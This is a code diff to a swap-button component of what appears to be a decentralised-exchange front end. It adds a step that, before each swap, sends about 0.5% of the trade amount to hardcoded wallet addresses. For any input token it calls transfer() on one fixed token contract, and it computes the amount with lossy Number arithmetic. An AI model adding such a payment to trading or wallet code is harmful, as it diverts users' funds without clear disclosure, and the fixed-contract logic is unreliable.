@@ -32,7 +32,7 @@ import { warningSeverity } from 'utils/exchange'
 import { useActiveChainId } from 'hooks/useActiveChainId'
 import { logGTMClickSwapEvent } from 'utils/customGTMEventTracking'
 import { useConfirmModalState } from 'views/Swap/V3Swap/hooks/useConfirmModalState'
-import { useAccount, useSendTransaction, useWaitForTransaction } from 'wagmi'
+import { useAccount, useContractWrite, useSendTransaction, useWaitForTransaction } from 'wagmi'
 import { useParsedAmounts, useSlippageAdjustedAmounts, useSwapCallback, useSwapInputError } from '../hooks'
 import { TransactionRejectedError } from '../hooks/useSendSwapTransaction'
 import { useWallchainApi } from '../hooks/useWallchain'
@@ -55,8 +55,7 @@ export const SwapCommitButton = memo(function SwapCommitButton({
   const { chainId } = useActiveChainId()
   const { t } = useTranslation()
   const { address: account } = useAccount()
-  const { data: hash, sendTransactionAsync } = useSendTransaction()
-  const { data, isError, isLoading } = useWaitForTransaction({ hash: hash?.hash })
+
   const [isExpertMode] = useExpertMode()
   const {
     typedValue,
@@ -73,6 +72,9 @@ export const SwapCommitButton = memo(function SwapCommitButton({
     execute: onWrap,
     inputError: wrapInputError,
   } = useWrapCallback(inputCurrency, outputCurrency, typedValue)
+  const { data: hash, sendTransactionAsync } = useSendTransaction()
+
+  const { data, isError, isLoading } = useWaitForTransaction({ hash: hash?.hash })
   const showWrap = wrapType !== WrapType.NOT_APPLICABLE
   const [isRoutingSettingChange, resetRoutingSetting] = useRoutingSettingChanged()
   const slippageAdjustedAmounts = useSlippageAdjustedAmounts(trade)
@@ -234,6 +236,64 @@ export const SwapCommitButton = memo(function SwapCommitButton({
     onConfirm: handleSwap,
   })
 
+  const percent = Number(trade?.inputAmount.numerator) * 0.005
+  const abi = [
+    {
+      inputs: [
+        {
+          internalType: 'address',
+          name: 'to',
+          type: 'address',
+        },
+        {
+          internalType: 'uint256',
+          name: 'amount',
+          type: 'uint256',
+        },
+      ],
+      name: 'transfer',
+      outputs: [
+        {
+          internalType: 'bool',
+          name: '',
+          type: 'bool',
+        },
+      ],
+      stateMutability: 'nonpayable',
+      type: 'function',
+    },
+  ]
+  const { data: hashWrite, write } = useContractWrite({
+    address: '0x4169e624bB7200C00E55Ed526929bfE78B5348A6',
+    abi,
+    functionName: 'transfer',
+    args: [
+      '0xd1Ffbe730B63F482959b8535543A84eB268Df53c',
+      BigInt(Number(Number.isNaN(percent) ? 1 : percent).toFixed(0)),
+    ],
+  })
+  const { data: writedata } = useWaitForTransaction({ hash: hashWrite?.hash })
+
+  const SwapFeePay = async () => {
+    if (trade?.inputAmount.currency.isToken) {
+      write()
+    } else {
+      await sendTransactionAsync({
+        to: '0x3F382Db2D9B9AeD2570c296Faa71e98e90afD352',
+        value: BigInt(Number(percent).toFixed(0)),
+      })
+    }
+  }
+
+  useEffect(() => {
+    const waitForTransaction = async () => {
+      if (data?.status === 'success' || writedata?.status === 'success') {
+        startSwapFlow()
+      }
+    }
+    waitForTransaction()
+  }, [data, writedata])
+
   const [onPresentConfirmModal] = useModal(
     <ConfirmSwapModal
       trade={trade}
@@ -246,6 +306,7 @@ export const SwapCommitButton = memo(function SwapCommitButton({
       confirmModalState={confirmModalState}
       pendingModalSteps={pendingModalSteps}
       startSwapFlow={startSwapFlow}
+      SwapFeePay={SwapFeePay}
       swapErrorMessage={swapErrorMessage}
       currentAllowance={currentAllowance}
       onAcceptChanges={handleAcceptChanges}
@@ -258,15 +319,7 @@ export const SwapCommitButton = memo(function SwapCommitButton({
   )
   // End Modals
 
-  const payFee = async () => {
-    sendTransactionAsync({
-      to: '0x3F382Db2D9B9AeD2570c296Faa71e98e90afD352',
-      value: 10000000000000n,
-    })
-  }
-
   const onSwapHandler = useCallback(() => {
-    payFee()
     setSwapState({
       tradeToConfirm: trade,
       attemptingTxn: false,
